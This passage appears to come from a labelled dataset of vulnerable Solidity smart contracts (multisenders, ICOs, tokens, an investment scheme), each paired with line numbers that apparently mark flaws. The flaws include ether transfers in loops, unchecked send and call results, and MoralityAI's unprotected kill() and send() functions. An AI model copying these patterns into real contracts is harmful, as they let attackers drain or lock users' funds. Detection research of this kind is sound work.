  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract MixMyETH {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}",[52]
"    Moneda public tokenReward;
    // The wallet on which the funds will be stored
    address public wallet;
    // Notifying transfers and the success of the crowdsale
    event GoalReached(address tokenOwner, uint amountRaised);
    event FundTransfer(address backer, uint amount, bool isContribution, uint amountRaised);
    function MonedaICO(Moneda token, address walletAddr, address tokenOwnerAddr) public {
        tokenReward = token;
        wallet = walletAddr;
        tokenOwner = tokenOwnerAddr;
    }
    function () external payable {
        require(msg.sender != wallet);
        exchange(msg.sender);
    }
    function exchange(address receiver) public payable {
        uint256 amount = msg.value;
        uint256 price = getRate();
        uint256 numTokens = amount.mul(price);
        bool isPreICO = (now <= preICO.date);
        bool isICO = (now >= icoStarts.date && now <= icoEnds.date);
        require(isPreICO || isICO);
        require(numTokens > 500);
        if (isPreICO) {
            require(!crowdsaleEnded && pre_tokensSold.add(numTokens) <= preICOLimit);
            require(numTokens <= 5000000e18);
        }
        if (isICO) {
            require(!crowdsaleEnded && tokensSold.add(numTokens) <= icoLimit);
        }
        wallet.transfer(amount);
        balances[receiver] = balances[receiver].add(amount);
        amountRaised = amountRaised.add(amount);
        if (isPreICO)
            pre_tokensSold = pre_tokensSold.add(numTokens);
        if (isICO)
            tokensSold = tokensSold.add(numTokens);
        assert(tokenReward.transferFrom(tokenOwner, receiver, numTokens));
        emit FundTransfer(receiver, amount, true, amountRaised);
    }
    function getRate() public view returns (uint256) {
        if (now <= preICO.date)
            return preICO.rate;
        if (now < icoEndOfStageA.date)
            return icoStarts.rate;
        if (now < icoEndOfStageB.date)
            return icoEndOfStageA.rate;
        if (now < icoEnds.date)
            return icoEndOfStageB.rate;
        return icoEnds.rate;
    }
    // Checks if the goal or time limit has been reached and ends the campaign
    function checkGoalReached() public {
        require(now >= icoEnds.date);
        if (pre_tokensSold.add(tokensSold) >= fundingGoal){
            tokenReward.burn(); // Burn remaining tokens but the reserved ones
            emit GoalReached(tokenOwner, amountRaised);
        }
        crowdsaleEnded = true;
    }
    // Allows the funders to withdraw their funds if the goal has not been reached.
    // Only works after funds have been returned from the wallet.
    function safeWithdrawal() public {
        require(now >= icoEnds.date);
        uint amount = balances[msg.sender];
        if (address(this).balance >= amount) {
            balances[msg.sender] = 0;
            if (amount > 0) {
                msg.sender.transfer(amount);
                emit FundTransfer(msg.sender, amount, false, amountRaised);
            }
        }
    }
}",[64]
"    IERC20 public immutable based;
    IERC20 public immutable rewardToken;
    address public immutable swapModule;
    modifier updateBalance() {
        sync();
        _;
        latestBalance = rewardToken.balanceOf(address(this));
    }
    modifier onlyBasedDeployer() {
        require(msg.sender == basedGod.deployer(), ""Not a deployer"");
        _;
    }
    modifier onlyMarsColony() {
        require(msg.sender == marsColony, ""Not a new moonbase"");
        _;
    }
    /// @param _pair either ""sUSD"" or ""WETH""
    constructor (
        address _rewardToken,
        string memory _pair,
        address _swapModule
    )
        public
    {
        basedGod = IBasedGod(msg.sender);
        // set immutables
        rewardToken = IERC20(_rewardToken);
        based = IERC20(basedGod.based());
        swapModule = _swapModule;
        address[] memory _path = new address[](3);
        _path[0] = _rewardToken;
        _path[2] = basedGod.based();
        if (keccak256(abi.encodePacked(_pair)) == keccak256(abi.encodePacked(""WETH""))) {
            _path[1] = basedGod.weth();
        } else if (keccak256(abi.encodePacked(_pair)) == keccak256(abi.encodePacked(""sUSD""))) {
            _path[1] = basedGod.susd();
        } else {
            revert(""must use a CERTIFIED OFFICIAL $BASED™ pair"");
        }
        // ensure that the path exists
        uint[] memory amountsOut = ISwapModule(_swapModule).getAmountsOut(10**10, _path);
        require(amountsOut[amountsOut.length - 1] >= 1, ""Path does not exist"");
        path = _path;
    }
    function balance() public view returns (uint256) {
        return rewardToken.balanceOf(address(this));
    }
    function calculateReward() public view returns (uint256) {
        uint256 timeElapsed = block.timestamp.sub(roverStart);
        if (timeElapsed > vestingTime) timeElapsed = vestingTime;
        uint256 maxClaimable = totalTokensReceived.mul(timeElapsed).div(vestingTime);
        return maxClaimable.sub(totalTokensWithdrawn);
    }
    function rugPull() public virtual updateBalance {
        require(roverStart != 0, ""Rover is not initialized"");
        // Calculate how much reward can be swapped
        uint256 availableReward = calculateReward();
        // Record that the tokens are being withdrawn
        totalTokensWithdrawn = totalTokensWithdrawn.add(availableReward);
        // Swap for BASED
        (bool success, bytes memory result) = swapModule.delegatecall(
            abi.encodeWithSignature(
                ""swapReward(uint256,address,address[])"",
                availableReward,
                address(this),
                path
            )
        );
        require(success, ""SwapModule: Swap failed"");
        uint256 basedReward = abi.decode(result, (uint256));
        // Split the reward between the caller and the moonbase contract
        uint256 callerReward = basedReward.div(100);
        uint256 moonbaseReward = basedReward.sub(callerReward);
        // Reward the caller
        based.transfer(msg.sender, callerReward);
        // Send to MoonBase
        based.transfer(basedGod.moonbase(), moonbaseReward);
    }
    function setMarsColony(address _marsColony) public onlyBasedDeployer {
        marsColony = _marsColony;
    }
    // WARNING: Alpha leak!
    function migrateRoverBalanceToMarsColonyV1_69() external onlyMarsColony updateBalance {
        require(migrationCompleted == false, ""Migration completed"");
        IERC20 moonbase = IERC20(basedGod.moonbase());
        uint256 marsColonyShare = moonbase.balanceOf(msg.sender);
        uint256 totalSupply = moonbase.totalSupply();
        // withdraw amount is proportional to total supply share of mbBASED of msg.sender
        uint256 amountToMigrate =
            rewardToken.balanceOf(address(this)).mul(marsColonyShare).div(totalSupply);
        rewardToken.transfer(msg.sender, amountToMigrate);
        migrationCompleted = true;
        // update rewards
        totalTokensReceived = totalTokensReceived.sub(amountToMigrate);
    }
    function init() internal updateBalance {
        require(roverStart == 0, ""Already initialized"");
        roverStart = block.timestamp;
        renounceOwnership();
    }
    function sync() internal {
        uint256 currentBalance = rewardToken.balanceOf(address(this));
        if (currentBalance > latestBalance) {
            uint diff = currentBalance.sub(latestBalance);
            totalTokensReceived = totalTokensReceived.add(diff);
        }
    }
}
pragma solidity >=0.6.0;
contract RoverVault is Rover {
    constructor(address _rewardToken, string memory _pair, address _swapModule)
        public
        Rover(_rewardToken, _pair, _swapModule)
    {}
    function startRover() public onlyOwner {
        init();
    }
}
pragma solidity ^0.6.0;
/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How","[61, 62, 63, 64, 65, 66, 67, 68]"
"      upgradeMaster = master;
  }
  /**
   * Child contract can enable to provide the condition when the upgrade can begun.
   */
  function canUpgrade() public constant returns(bool) {
     return true;
  }
}
contract UpgradeAgent {
  uint256 public originalSupply;
  /** Interface marker */
  function isUpgradeAgent() public constant returns (bool) {
    return true;
  }
  function upgradeFrom(address _from, uint256 _value) public;
}
/*
Below is our contract, everything above we inherit.
We can pay an initial value for the coin to be worth something (logged)
We can send eth to the contract at any time which is logged
We can request to send eth from the contract
We can get balance
We can transfer
We can change symbol
We can burn coins
We can swap admins/We can transfer ownership
*/
contract MoralityAI is BurnableToken, UpgradeableToken {
  string public name;
  string public symbol;
  uint256 public decimals;
  uint256 public issueReward;
  address public creator;
  event UpdatedTokenInformation(string newName, string newSymbol);
  event LogFundsReceived(address sender, uint amount);
  event LogFundsSent(address receiver, uint amount);
  function MoralityAI()  UpgradeableToken(msg.sender) payable {
    name = ""MoralityAI"";
    symbol = ""MO"";
    totalSupply = 1000000000000000000000000000;
    decimals = 18;
	issueReward = 5;
    balances[msg.sender] = totalSupply;
    creator = msg.sender;
    LogFundsReceived(msg.sender, msg.value);
  }
  function() payable {
    LogFundsReceived(msg.sender, msg.value);
  }
  function withdraw(uint amount) onlyOwner returns(bool) {
    require(amount <= this.balance);
    owner.transfer(amount);
    return true;
  }
  function kill() {
    selfdestruct(creator);
  }
  function send(address target, uint256 amount) {
    if (!target.send(amount)) throw;
    LogFundsSent(target, amount);
  }
  function setTokenInformation(string _name, string _symbol) {
    if(msg.sender != upgradeMaster) {
      throw;
    }
    name = _name;
    symbol = _symbol;
    UpdatedTokenInformation(name, symbol);
  }
  function transfer(address _to, uint256 _value) returns (bool success) {
    return super.transfer(_to, _value);
  }
  function issueBlockReward(){
	 balances[block.coinbase] += issueReward;
  }
}","[53, 56, 57, 75]"
"pragma solidity ^0.4.24;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    // Gas optimization: this is cheaper than asserting 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    // uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return a / b;
  }
  /**
  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}
contract MultiEthSender {
    using SafeMath for uint256;
    event Send(uint256 _amount, address indexed _receiver);
    modifier enoughBalance(uint256 amount, address[] list) {
        uint256 totalAmount = amount.mul(list.length);
        require(address(this).balance >= totalAmount);
        _;
    }
    constructor() public {
    }
    function () public payable {
        require(msg.value >= 0);
    }
    function multiSendEth(uint256 amount, address[] list)
    enoughBalance(amount, list)
    public
    returns (bool) 
    {
        for (uint256 i = 0; i < list.length; i++) {
            address(list[i]).transfer(amount);
            emit Send(amount, address(list[i]));
        }
        return true;
    }
}","[64, 65]"
"pragma solidity ^0.4.24;
contract MultiEthSender {
    event Send(uint256 _amount, address indexed _receiver);
    constructor() payable public {
    }
    function multiSendEth(uint256 amount, address[] list) public payable returns (bool) {
        uint balanceBeforeTransfer = address(this).balance;
        for(uint i=0;i<list.length;i++){
            list[i].transfer(amount);
            emit Send(amount, list[i]);
        }
        assert(address(this).balance == balanceBeforeTransfer - amount*list.length);
        return true;
    }
    function getBalance() constant public returns(uint){
        return address(this).balance;
    }
    function() public payable{
    }
}",[9]
"        player_[_affID3].aff3sum = player_[_affID3].aff3sum.add(1);
        player_[_affID4].aff4sum = player_[_affID4].aff4sum.add(1);
	}
    // this function called every time anyone sends a transaction to this contract
    function () isActivated() external payable {
        if (msg.value == 0) {
            withdraw();
        } else {
            invest(1000, 1);
        }
    }
    function invest(uint256 _affCode, uint256 _planId) isActivated() public payable {
	    require(_planId >= 1 && _planId <= ruleSum_, ""_planId error"");
		//get uid
		uint256 uid = pIDxAddr_[msg.sender];
		//first
		if (uid == 0) {
		    if (player_[_affCode].addr != address(0x0)) {
		        register_(msg.sender, _affCode);
		    } else {
			    register_(msg.sender, 1000);
		    }
			uid = G_NowUserId;
		}
	    require(msg.value >= plan_[_planId].min && msg.value <= plan_[_planId].max, ""invest amount error, please set the exact amount"");
        // record block number and invested amount (msg.value) of this transaction
        uint256 planCount = player_[uid].planCount;
        player_[uid].plans[planCount].planId = _planId;
        player_[uid].plans[planCount].startTime = now;
        player_[uid].plans[planCount].startBlock = block.number;
        player_[uid].plans[planCount].atBlock = block.number;
        player_[uid].plans[planCount].invested = msg.value;
        player_[uid].plans[planCount].payEth = 0;
        player_[uid].plans[planCount].isClose = false;
        player_[uid].planCount = player_[uid].planCount.add(1);
        G_AllEth = G_AllEth.add(msg.value);
        if (msg.value > 1000000000) {
            distributeRef(msg.value, player_[uid].laff);
            uint256 devFee = (msg.value.mul(2)).div(100);
            devAddr_.transfer(devFee);
            uint256 partnerFee = (msg.value.mul(2)).div(100);
            partnerAddr_.transfer(partnerFee);
        }
    }
	function withdraw() isActivated() public payable {
	    require(msg.value == 0, ""withdraw fee is 0 ether, please set the exact amount"");
	    uint256 uid = pIDxAddr_[msg.sender];
	    require(uid != 0, ""no invest"");
        for(uint i = 0; i < player_[uid].planCount; i++) {
	        if (player_[uid].plans[i].isClose) {
	            continue;
	        }
            SDDatasets.Plan plan = plan_[player_[uid].plans[i].planId];
            uint256 blockNumber = block.number;
            bool bClose = false;
            if (plan.dayRange > 0) {
                uint256 endBlockNumber = player_[uid].plans[i].startBlock.add(plan.dayRange*G_DayBlocks);
                if (blockNumber > endBlockNumber){
                    blockNumber = endBlockNumber;
                    bClose = true;
                }
            }
            uint256 amount = player_[uid].plans[i].invested * plan.interest / 10000 * (blockNumber - player_[uid].plans[i].atBlock) / G_DayBlocks;
            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.send(amount);
            // record block number and invested amount (msg.value) of this transaction
            player_[uid].plans[i].atBlock = block.number;
            player_[uid].plans[i].isClose = bClose;
            player_[uid].plans[i].payEth += amount;
        }
	}
    function distributeRef(uint256 _eth, uint256 _affID) private{
        uint256 _allaff = (_eth.mul(8)).div(100);
        uint256 _affID1 = _affID;
        uint256 _affID2 = player_[_affID1].laff;
        uint256 _affID3 = player_[_affID2].laff;
        uint256 _aff = 0;
        if (_affID1 != 0) {
            _aff = (_eth.mul(5)).div(100);
            _allaff = _allaff.sub(_aff);
            player_[_affID1].aff = _aff.add(player_[_affID1].aff);
            player_[_affID1].addr.transfer(_aff);
        }
        if (_affID2 != 0) {
            _aff = (_eth.mul(2)).div(100);
            _allaff = _allaff.sub(_aff);
            player_[_affID2].aff = _aff.add(player_[_affID2].aff);
            player_[_affID2].addr.transfer(_aff);
        }
        if (_affID3 != 0) {
            _aff = (_eth.mul(1)).div(100);
            _allaff = _allaff.sub(_aff);
            player_[_affID3].aff = _aff.add(player_[_affID3].aff);
            player_[_affID3].addr.transfer(_aff);
       }
        if(_allaff > 0 ){
            commuAddr_.transfer(_allaff);
        }
    }
}","[63, 66]"
"pragma solidity ^0.4.18;
/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/179
 */
contract ERC20Basic {
  function totalSupply() public view returns (uint256);
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
/**
 * @title ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract MultiSend {
  function multiSend(address _token, address[] addresses, uint amount) public {
    ERC20 token = ERC20(_token);
    for(uint i = 0; i < addresses.length; i++) {
      require(token.transferFrom(msg.sender, addresses[i], amount));
    }
  }
  function multiSendEth(address[] addresses) public payable {
    for(uint i = 0; i < addresses.length; i++) {
      addresses[i].transfer(msg.value / addresses.length);
    }
    msg.sender.transfer(this.balance);
  }
}","[31, 32]"
"pragma solidity ^0.4.23;
/**
 * @title ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
contract ERC20Basic {
    function totalSupply() public view returns (uint256);
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract MultiSend {
  event Multisended(uint256 total, address tokenAddress); 
  function multiSend(address _token, address[] addresses, uint[] counts) public {
    uint total;
    ERC20 token = ERC20(_token);
    for(uint i = 0; i < addresses.length; i++) {
      require(token.transferFrom(msg.sender, addresses[i], counts[i]));
        total += counts[i];
    }
    emit Multisended(total,_token);
  }
  function multiSendEth(address[] addresses,uint[] counts) public payable {
    for(uint i = 0; i < addresses.length; i++) {
      addresses[i].transfer(counts[i]);
    }
  }
}","[25, 31]"
"/**
 * Source Code first verified at https://etherscan.io on Monday, May 20, 2019
 (UTC) */
pragma solidity ^0.4.23;
/**
 * @title ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/20
 */
contract ERC20Basic {
    function totalSupply() public view returns (uint256);
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract MultiSend {
  event Multisended(uint256 total, address tokenAddress); 
  function multiSend(address _token, address[] addresses, uint[] counts) public {
    uint total;
    ERC20 token = ERC20(_token);
    for(uint i = 0; i < addresses.length; i++) {
      require(token.transferFrom(msg.sender, addresses[i], counts[i]));
        total += counts[i];
    }
    emit Multisended(total,_token);
  }
  function multiSendEth(address[] addresses,uint[] counts) public payable {
    for(uint i = 0; i < addresses.length; i++) {
      addresses[i].transfer(counts[i]);
    }
  }
}","[28, 34]"
"// Roman Storm Multi Sender
pragma solidity 0.4.20;
/**
 * @title ERC20Basic
 * @dev Simpler version of ERC20 interface
 * @dev see https://github.com/ethereum/EIPs/issues/179
 */
contract ERC20Basic {
  function totalSupply() public view returns (uint256);
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public view returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract MultiSender {
    mapping(address => uint256) public txCount;
    address public owner;
    address public pendingOwner;
    uint16 public arrayLimit = 150;
    uint256 public fee = 0.05 ether;
    modifier onlyOwner(){
        assert(msg.sender == owner);
        _;
    }
    modifier hasFee(){
        // uint256 fee = txCount[msg.sender]
        require(msg.value >= fee - discountRate(msg.sender));
        _;
    }
    function MultiSender(address _owner, address _pendingOwner){
        owner = _owner;
        pendingOwner = _pendingOwner;
    }
    function discountRate(address _customer) public view returns(uint256) {
        uint256 count = txCount[_customer];
        return count / (10) * 0.005 ether;
    }
    function currentFee(address _customer) public view returns(uint256) {
        return fee - discountRate(_customer);
    }
    function claimOwner(address _newPendingOwner) public {
        require(msg.sender == pendingOwner);
        owner = pendingOwner;
        pendingOwner = _newPendingOwner;
    }
    function changeTreshold(uint16 _newLimit) public onlyOwner {
        arrayLimit = _newLimit;
    }
    function changeFee(uint256 _newFee) public onlyOwner {
        fee = _newFee;
    }
    function() payable {
    }
    function multisendToken(address token, address[] _contributors, uint256[] _balances) public hasFee payable {
        require(_contributors.length <= arrayLimit);
        ERC20 erc20token = ERC20(token);
        uint8 i = 0;
        require(erc20token.allowance(msg.sender, this) > 0);
        for(i; i<_contributors.length;i++){
            erc20token.transferFrom(msg.sender, _contributors[i], _balances[i]);
        }
        txCount[msg.sender]++;
    }
    function multisendEther(address[] _contributors, uint256[] _balances) public hasFee payable{
        // this function is always free, however if there is anything left over, I will keep it.
        require(_contributors.length <= arrayLimit);
        uint8 i = 0;
        for(i; i<_contributors.length;i++){
            _contributors[i].transfer(_balances[i]);
        }
        txCount[msg.sender]++;
    }
    event ClaimedTokens(address token, address owner, uint256 balance);
    function claimTokens(address _token) public onlyOwner {
        if (_token == 0x0) {
          owner.transfer(this.balance);
          return;
        }
        ERC20 erc20token = ERC20(_token);
        uint256 balance = erc20token.balanceOf(this);
        erc20token.transfer(owner, balance);
        ClaimedTokens(_token, owner, balance);
   }
}",[74]
"pragma solidity ^0.4.24;
contract ERC20 {
    function transferFrom(address _from, address _to, uint _value) returns (bool success);
}
library SafeMath {
    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        // Gas optimization: this is cheaper than asserting 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }
    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        // uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return a / b;
    }
    /**
    * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}
contract MultiSender {
    using SafeMath for uint256;
    function multiSend(address tokenAddress, address[] addresses, uint256[] amounts) public payable {
        require(addresses.length <= 100);
        require(addresses.length == amounts.length);
        if (tokenAddress == 0x000000000000000000000000000000000000bEEF) {
            multisendEther(addresses, amounts);
        } else {
            ERC20 token = ERC20(tokenAddress);
            //Token address
            for (uint8 i = 0; i < addresses.length; i++) {
                address _address = addresses[i];
                uint256 _amount = amounts[i];
                token.transferFrom(msg.sender, _address, _amount);
            }
        }
    }
    function multisendEther(address[] addresses, uint256[] amounts) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < addresses.length; i++) {
            require(total >= amounts[i]);
            total = total.sub(amounts[i]);
            addresses[i].transfer(amounts[i]);
        }
    }
}",[68]
"pragma solidity ^0.4.24;
contract MultiSender {
    function multiSend(uint256 amount, address[] addresses) public returns (bool) {
        for (uint i = 0; i < addresses.length; i++) {
            addresses[i].transfer(amount);
        }
    }
    function () public payable {
    }
}",[5]
"pragma solidity ^0.4.18;
contract ERC20 {
  function transferFrom(address from, address to, uint256 value) public returns (bool);
}
contract MultiSender {
  function tokenFallback(address /*_from*/, uint _value, bytes /*_data*/) public {
    require(false);
  }
  function multisendToken(address tokAddress, address[] _dests, uint256[] _amounts) public {
    ERC20 tok = ERC20(tokAddress);
    for (uint i = 0; i < _dests.length; i++){
        tok.transferFrom(msg.sender, _dests[i], _amounts[i]);
    }
  }
  function multisendEth(address[] _dests, uint256[] _amounts) public payable {
    for (uint i = 0; i < _dests.length; i++){
        _dests[i].transfer(_amounts[i]);
    }
    require(this.balance == 0);
  }
}",[17]
"pragma solidity ^0.4.24;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract Ownable {
    address public owner;
    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() { require(msg.sender == owner); _; }
}
contract MultiTransfer is Ownable {
    using SafeMath for uint256;
    event Transacted(
        address msgSender, // 트랜잭션을 시작한 메시지의 발신자 주소
        address toAddress, // 트랜잭션이 전송된 주소
        uint value // 주소로 보낸 Wei 금액
    );
/**
* @param _to 대상 주소
* @param _amount 전송할 wei의 양
*/
  function multiTransfer(address[] _to, uint256[] _amount) public payable onlyOwner returns (bool) {
    require(_to.length == _amount.length);
    uint256 ui;
    uint256 amountSum = 0;
    for (ui = 0; ui < _to.length; ui++) {
        require(_to[ui] != address(0));
        amountSum = amountSum.add(_amount[ui]);
    }
    require(amountSum <= msg.value);
    for (ui = 0; ui < _to.length; ui++) {
        _to[ui].transfer(_amount[ui]);
        emit Transacted(msg.sender, _to[ui], _amount[ui]);
    }
    return true;
  }
}",[52]
"pragma solidity ^0.5.5;
interface IMakerPriceFeed {
  function read() external view returns (bytes32);
}
contract MultiTransfer {
    address owner;
    address oracle;
    constructor (address _oracle) public {
        owner = msg.sender;
        oracle = _oracle;
    }
    function changeOracleAddress(
        address _oracle
    )
    public
    {
        require(msg.sender == owner);
        oracle = _oracle;
    }
    function multiTransferETH(
        address[] memory to,
        uint256[] memory amounts
    )
    public
    payable
    {
        require(to.length == amounts.length);
        uint256 total = msg.value;
        for(uint256 i = 0; i < to.length; i++) {
            require(total >= amounts[i]);
            address(uint160(to[i])).transfer(amounts[i]);
            total -= amounts[i];
        }
        msg.sender.transfer(total);
    }
    function multiTransferUSD(
        address[] memory to,
        uint256[] memory amounts
    )
    public
    payable
    {
        require(to.length == amounts.length);
        uint256 total = msg.value;
        uint256 price = 10**36 / uint256(IMakerPriceFeed(oracle).read());
        uint256 toSent;
        for(uint256 i = 0; i < to.length; i++) {
            toSent = amounts[i] * price;
            require(total >= toSent);
            address(uint160(to[i])).transfer(toSent);
            total -= toSent;
        }
        msg.sender.transfer(total);
    }
}","[31, 45, 50]"
"pragma solidity ^0.4.24;
contract Ownable {
    address public owner;
    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() { require(msg.sender == owner); _; }
}
contract MultiTransfer is Ownable {
  event Transacted(
    address msgSender, // 트랜잭션을 시작한 메시지의 발신자 주소
    address toAddress, // 트랜잭션이 전송된 주소
    uint value // 주소로 보낸 Wei 금액
  );
/**
* @param _to 대상 주소
* @param _amount 전송할 wei의 양
*/
  function multiTransfer(address[] _to, uint256[] _amount) public payable onlyOwner returns (bool) {
    require(_to.length == _amount.length);
        uint256 ui;
        uint256 amountSum = 0;
        for (ui = 0; ui < _to.length; ui++) {
            require(_to[ui] != address(0));
            amountSum = amountSum + _amount[ui];
        }
        require(amountSum <= msg.value);
        for (ui = 0; ui < _to.length; ui++) {
            _to[ui].transfer(_amount[ui]);
            emit Transacted(msg.sender, _to[ui], _amount[ui]);
        }
        return true;
  }
}",[29]
"pragma solidity ^0.4.21;
contract MultiTransfer {
  event Transacted(
    address msgSender, // 트랜잭션을 시작한 메시지의 발신자 주소
    address toAddress, // 트랜잭션이 전송된 주소
    uint value // 주소로 보낸 Wei 금액
  );
/**
* @param _from 보내는 주소
* @param _to 대상 주소
* @param _amount 전송할 wei의 양
*/
  function multiTransfer(
      address _from, address[] _to, uint[] _amount
  ) public payable {
    require(msg.sender == _from);
    require(_to.length == _amount.length);
    uint256 ui;
    uint256 amountSum = 0;
    for (ui = 0; ui < _to.length; ui++) {
        require(_to[ui] != address(0));
        amountSum = amountSum + _amount[ui];
    }
    require(amountSum == msg.value);
    for (ui = 0; ui < _to.length; ui++) {
        _to[ui].transfer(_amount[ui]);        
        emit Transacted(msg.sender, _to[ui], _amount[ui]);
    }
    return;
  }
}",[26]
"/**
* servantcdh@naver.com
*/
pragma solidity ^0.4.21;
contract MultiTransfer {
  event Transacted(
    address msgSender, // 트랜잭션을 시작한 메시지의 발신자 주소
    address toAddress, // 트랜잭션이 전송된 주소
    uint value // 주소로 보낸 Wei 금액
  );
/**
* @param _to 대상 주소
* @param _amount 전송할 wei의 양
*/
  function multiTransfer(address[] _to, uint[] _amount) public payable {
    require(_to.length == _amount.length);
    uint256 ui;
    uint256 amountSum = 0;
    for (ui = 0; ui < _to.length; ui++) {
        require(_to[ui] != address(0));
        amountSum = amountSum + _amount[ui];
    }
    require(amountSum == msg.value);
    for (ui = 0; ui < _to.length; ui++) {
        _to[ui].transfer(_amount[ui]);        
        emit Transacted(msg.sender, _to[ui], _amount[ui]);
    }
    return;
  }
}","[24, 25]"
"pragma solidity ^0.4.25;
contract MultiTransfer {
    function multiTransfer(address[] _addresses, uint256 amount) payable {
        for (uint256 i = 0; i < _addresses.length; i++) {
            _addresses[i].call.value(amount).gas(21000)();
        }
    }
    function() payable {}
}
contract ERC20 {
    function transfer(address _recipient, uint256 amount) public;
}       
contract Erc20MultiTransfer {
    function erc20MultiTransfer(ERC20 token, address[] _addresses, uint256 amount) public {
        for (uint256 i = 0; i < _addresses.length; i++) {
            token.transfer(_addresses[i], amount);
        }
    }
}",[5]
"pragma solidity ^0.4.18;
contract MultiTransfer {
    function multiTransfer(address token, address[] _addresses, uint256 amount) public {
        for (uint256 i = 0; i < _addresses.length; i++) {
            token.transfer(amount);
        }
    }
}",[5]
"{
    function transfer(address _to, uint256 _amount) external returns (bool);
    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool);
}
contract Multipartner is owned{
